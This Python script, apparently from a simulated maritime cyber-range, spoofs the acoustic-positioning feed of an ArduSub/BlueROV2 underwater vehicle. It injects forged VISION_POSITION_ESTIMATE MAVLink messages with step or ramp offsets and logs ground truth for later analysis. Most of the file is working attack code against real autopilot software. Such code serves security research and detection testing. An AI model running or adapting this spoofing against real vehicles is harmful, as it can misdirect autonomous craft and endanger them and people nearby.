"""
WO-16: Acoustic-positioning spoofing -- the SUBMERGED analog of GPS spoofing.

Why this exists (investigated live, not assumed): a submerged AUV gets no GPS
(RF doesn't penetrate water). ArduSub's default config confirms it -- the
BlueROV2 uses EK3_SRC1_POSXY = 6 (ExternalNav), NOT GPS, for horizontal
position. Its absolute position while submerged comes from an acoustic
positioning system (USBL/LBL/DVL), fed into ArduPilot as VISION_POSITION_ESTIMATE
(MAVLink #102). Spoofing GPS or the FDM position field therefore does nothing to
a submerged AUV (verified: GPS_RAW_INT ignores an FDM-position ramp). The real
attack surface underwater is that acoustic-positioning feed.

This module plays BOTH the legitimate acoustic-positioning provider AND the
attacker on the same channel -- exactly like attacks/gps_spoof.py is a relay
that's transparent when off and injects an offset when on:
  * spoof OFF  -> feeds the AUV's TRUE position (read from Gazebo) via
                  VISION_POSITION_ESTIMATE == a working USBL/DVL. This is also
                  what gives the submerged AUV a valid horizontal fix at all
                  (without an external-nav feed its GLOBAL_POSITION_INT is 0,0).
  * spoof ON   -> feeds TRUE + a forged offset, so the AUV's BELIEVED position
                  diverges from its true Gazebo position -- the acoustic analog
                  of walking the surface vessel's GPS off with gps_spoof.

Frames: Gazebo world is ENU (x=East, y=North, z=Up); VISION_POSITION_ESTIMATE is
NED relative to the EKF origin (x=North, y=East, z=Down). So
  N = gazebo_y,  E = gazebo_x,  D = -gazebo_z.

Connection: talks straight to ArduSub's spare MAVLink port (SERIAL1, tcp:5762 by
default) so it doesn't contend with the dashboard/bridge. Override with
MCR_ACOUSTIC_ENDPOINT.

USAGE:
  MCR_VEHICLE_PROFILE=bluerov2 python3 attacks/acoustic_spoof.py
Interactive: 'step' | 'ramp' | 'off' | 'quit' (same verbs as gps_spoof).
"""
import os
import sys
import csv
import math
import time
import threading
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import constants
from pymavlink import mavutil

ENDPOINT = os.environ.get("MCR_ACOUSTIC_ENDPOINT", "tcp:127.0.0.1:5762")
ODOM_TOPIC = os.environ.get("MCR_ACOUSTIC_ODOM_TOPIC", f"/model/{constants.MODEL_NAME}/odometry")

ATTACK_LOG_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "attack_logs", "acoustic_spoof_ground_truth.csv")
os.makedirs(os.path.dirname(ATTACK_LOG_PATH), exist_ok=True)
_log_lock = threading.Lock()


def log_attack_event(wall_ts, mode, true_n, true_e, forged_n, forged_e):
    with _log_lock:
        write_header = not os.path.exists(ATTACK_LOG_PATH)
        with open(ATTACK_LOG_PATH, "a", newline="") as f:
            w = csv.writer(f)
            if write_header:
                w.writerow(["wall_ts", "mode", "true_north_m", "true_east_m",
                            "forged_north_m", "forged_east_m"])
            w.writerow([wall_ts, mode, true_n, true_e, forged_n, forged_e])


class SpoofState:
    def __init__(self):
        self.active = False
        self.mode = None                 # "step" | "ramp"
        self.start_time = None
        self.step_offset_m = 50.0
        self.ramp_rate_m_per_s = 0.5
        self.direction_deg = 90.0        # bearing of the forged offset (0=N, 90=E)


state = SpoofState()
_lock = threading.Lock()


def compute_offset_m():
    with _lock:
        if not state.active:
            return 0.0, 0.0
        mode, start = state.mode, state.start_time
        step, rate, bearing = state.step_offset_m, state.ramp_rate_m_per_s, state.direction_deg
    magnitude = step if mode == "step" else (rate * (time.time() - start) if mode == "ramp" else 0.0)
    br = math.radians(bearing)
    return magnitude * math.cos(br), magnitude * math.sin(br)  # (north, east)


# --- true pose from Gazebo (ENU) -> NED --------------------------------------
def read_true_ned(proc_holder):
    """Yields (N, E, D) from the AUV's true Gazebo odometry, continuously."""
    proc = subprocess.Popen(["gz", "topic", "-e", "-t", ODOM_TOPIC],
                            stdout=subprocess.PIPE, text=True)
    proc_holder["proc"] = proc
    import re
    block = ""
    in_pose = False
    for line in proc.stdout:
        if "pose {" in line:
            in_pose = True; block = ""
            continue
        if in_pose:
            block += line
            if line.strip() == "}" and "position" in block:
                mx = re.search(r"x:\s*([-\d.e]+)", block)
                my = re.search(r"y:\s*([-\d.e]+)", block)
                mz = re.search(r"z:\s*([-\d.e]+)", block)
                in_pose = False
                if mx and my and mz:
                    gx, gy, gz = float(mx.group(1)), float(my.group(1)), float(mz.group(1))
                    yield (gy, gx, -gz)  # N, E, D


# --- feed loop ---------------------------------------------------------------
def run_feed(conn):
    """Continuously feeds VISION_POSITION_ESTIMATE (true position + any active
    spoof offset). Transparent USBL when spoof is off; false position when on."""
    # EKF needs an origin to map local NED -> global lat/lon.
    conn.mav.set_gps_global_origin_send(
        conn.target_system, int(constants.HOME_LAT * 1e7), int(constants.HOME_LON * 1e7), 0)
    print(f"Acoustic-positioning feed live on {ENDPOINT}. Spoof OFF (transparent USBL).")
    print("Commands: step | ramp | off | quit")
    holder = {}
    last_log = 0.0
    for (tn, te, td) in read_true_ned(holder):
        off_n, off_e = compute_offset_m()
        fn, fe = tn + off_n, te + off_e
        us = int(time.time() * 1e6)
        conn.mav.vision_position_estimate_send(us, fn, fe, td, 0.0, 0.0, 0.0)
        with _lock:
            active, mode = state.active, state.mode
        if active and time.time() - last_log > 0.5:
            log_attack_event(time.time(), mode, tn, te, fn, fe)
            last_log = time.time()


def control_cli():
    while True:
        cmd = input("> ").strip().lower()
        if cmd == "step":
            with _lock:
                state.mode = "step"; state.start_time = time.time(); state.active = True
            print(f"STEP acoustic spoof ON: +{state.step_offset_m} m at bearing {state.direction_deg}")
        elif cmd == "ramp":
            with _lock:
                state.mode = "ramp"; state.start_time = time.time(); state.active = True
            print(f"RAMP acoustic spoof ON: {state.ramp_rate_m_per_s} m/s at bearing {state.direction_deg}")
        elif cmd == "off":
            with _lock:
                state.active = False
            print("Acoustic spoof OFF -- feeding true position (legitimate USBL).")
        elif cmd == "quit":
            os._exit(0)
        else:
            print("Commands: step | ramp | off | quit")


def connect():
    print(f"Connecting to ArduSub at {ENDPOINT} ...")
    conn = mavutil.mavlink_connection(ENDPOINT, source_system=1, source_component=197)
    if conn.wait_heartbeat(timeout=20) is None:
        print(f"ERROR: no heartbeat on {ENDPOINT}")
        sys.exit(1)
    print(f"Connected to system {conn.target_system}.")
    return conn


if __name__ == "__main__":
    conn = connect()
    t = threading.Thread(target=run_feed, args=(conn,), daemon=True)
    t.start()
    control_cli()
